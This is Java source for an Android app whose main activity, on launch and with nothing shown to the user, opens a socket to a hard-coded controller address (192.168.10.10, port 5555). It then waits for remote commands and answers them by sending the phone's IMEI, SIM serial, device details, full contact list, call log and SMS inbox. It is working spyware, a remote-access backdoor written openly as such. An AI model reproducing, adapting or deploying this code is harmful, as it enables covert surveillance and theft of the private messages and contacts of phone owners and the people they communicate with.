package com.example.high_1;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;


import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;

import android.telephony.TelephonyManager;
import android.view.Menu;

public class MainActivity extends Activity {
	
	
	 DataOutputStream toServer = null;
     BufferedReader fromServer = null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		getJavaReverseShell();
		
		
		
		
		
		
		
	}

	private void getJavaReverseShell() {
		// TODO Auto-generated method stub
		
		Thread thread = new Thread(){
			
			 @Override
	            public void run(){
				 
				 String serverip = "192.168.10.10";
	             int port = 5555;
	             
	             boolean run = true;
	             
	             try{
	            	 InetAddress host = InetAddress.getByName(serverip);

	                  Socket socket = new Socket(host, port);
	                  
	                  while(run){
	                	  
	                	  toServer = new DataOutputStream(socket.getOutputStream());
	                      fromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));
	                      String command = fromServer.readLine();
	                      if (command.equalsIgnoreCase("deviceInfo")){
	                          toServer.writeBytes(deviceInfo());
	                      }
	                      if (command.equalsIgnoreCase("mobileInfo")){
	                          toServer.writeBytes(mobileInfo());
	                      }
	                      if (command.equalsIgnoreCase("getContacts")){
	                          toServer.writeBytes(getContacts());
	                      }
	                     
	                      
	                      if (command.equalsIgnoreCase("callLog")){
	                          toServer.writeBytes(callLog());
	                      }
	                      
	                      if (command.equalsIgnoreCase("getSms")){
	                          toServer.writeBytes(GetyourNumber());
	                      }
	                      
	                      
	                      
	                      
	                      
	                      

	                	  
	                	  
	                	  
	                	  
	                	  
	                  
	                	  
	                	  
	                	  
	                	  
	                	  
	                  }//while loop
	                  
	            	 
	            	 
	            	 
	            	 
	            	 
	                  	 
	            	 
	             }catch(Exception e){
	            	 
	            	 e.printStackTrace(); 
	            	 
	             }
				 
			 
			 
			 
			 
			 
			 
			 
			 
			 
			 
			 
			 
			 
			 }//public void run
			
			
			
			
			
		
		
		
		
		
		

			private String GetyourNumber() {
				// TODO Auto-generated method stub
				String sms= "---------------------------------\n";
				Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
				while (c.moveToNext()) {
					sms = sms + "Number: " + c.getString(c.getColumnIndexOrThrow("address")) +
	                        "\nBody: " + c.getString(c.getColumnIndexOrThrow("body")) + "\n"; 
					
					sms +="-----------------------------------------------\n";
				}
				c.close();
				
				
				
				
				return sms;

				
				
				
				
			}












			private String callLog() {
				// TODO Auto-generated method stub

	            StringBuffer sb = new StringBuffer();
	            
	            Cursor cursor_managed = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
	           int number= cursor_managed.getColumnIndex(CallLog.Calls.NUMBER);
	            int type= cursor_managed.getColumnIndex(CallLog.Calls.TYPE);
	            int date= cursor_managed.getColumnIndex(CallLog.Calls.DATE);
	            int duration= cursor_managed.getColumnIndex(CallLog.Calls.DURATION);
	            sb.append("Call Details :\n");
	            while(cursor_managed.moveToNext()){
	                String phnumber=cursor_managed.getString(number);
	                String CallType=cursor_managed.getString(type);
	                String CallDate=cursor_managed.getString(date);
	                Date callDayTime=new Date(Long.valueOf(CallDate));
	                SimpleDateFormat formatter= new SimpleDateFormat("dd-MM-yy HH:mm");
	                String dateString =formatter.format(callDayTime);
	                String CallDuration=cursor_managed.getString(duration);
	                String dir=null;
	                switch(Integer.parseInt(CallType)){
	                    case CallLog.Calls.OUTGOING_TYPE: dir="OUTGOING";break;
	                    case CallLog.Calls.INCOMING_TYPE: dir="INCOMING";break;
	                    case CallLog.Calls.MISSED_TYPE: dir="MISSED";break;
	                }
	               sb.append("Phone number: "+phnumber+" Call type: "+dir+"\n Call date: "+dateString+" Call duration in sec: "+CallDuration);
	                sb.append("\n-------------------------------\n");
	            }cursor_managed.close();


	       return sb.toString();
				
				
				
				
			}












			












			private String getContacts() {
				// TODO Auto-generated method stub
				//raw +="IMEI Number :" + manager.getDeviceId() +"\n";
				
				String contact = "-------------------------------------------------\n";
				Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME);
				
				while(c.moveToNext()){
					contact += "Name :"+c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + "\n";
					contact+=  "Number  :" + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n";
					
					contact+="-----------------------------------------------\n";
				}
				c.close();
				
				return contact;
			}












			private String mobileInfo() {
				// TODO Auto-generated method stub
				TelephonyManager  manager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
				
				
				String raw = "--------------------------------------\n";
				raw +="IMEI Number :" + manager.getDeviceId() +"\n";
				raw +="SIM Serial Number :" + manager.getSimSerialNumber() +"\n";
				raw +="Network Country ISO :" + manager.getNetworkCountryIso() +"\n";
				raw +="Sim Operation Name :" + manager.getSimOperatorName() +"\n";
				
				
				
				
				
				
				raw += "--------------------------------------------\n";
				return raw;
			}












			private String deviceInfo() {
				
				String ret = "--------------------------------------------\n";
		        ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
		        ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
		        ret += "Product: "+android.os.Build.PRODUCT+"\n";
		        ret += "Model: "+android.os.Build.MODEL+"\n";
		        ret += "Brand: "+android.os.Build.BRAND+"\n";
		        ret += "Device: "+android.os.Build.DEVICE+"\n";
		        ret += "Host: "+android.os.Build.HOST+"\n";
		        ret += "Board: "+android.os.Build.BOARD+"\n";
		        ret += "BootLoader: "+android.os.Build.BOOTLOADER+"\n";
		        ret += "User: "+android.os.Build.USER +"\n";
		        ret += "Display: "+android.os.Build.DISPLAY +"\n";
		        ret += "CPU-ABI: "+android.os.Build.CPU_ABI +"\n";
		        ret += "FingerPrint: "+android.os.Build.FINGERPRINT +"\n";
		        ret += "HOST: "+android.os.Build.HOST +"\n";
		        
		        
		        ret += "--------------------------------------------\n";
		        return ret;
			}
				
				
				
				
				
			
			
			}; 
			thread.start(); //THread ending
		
	}//getReverseshell ending

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
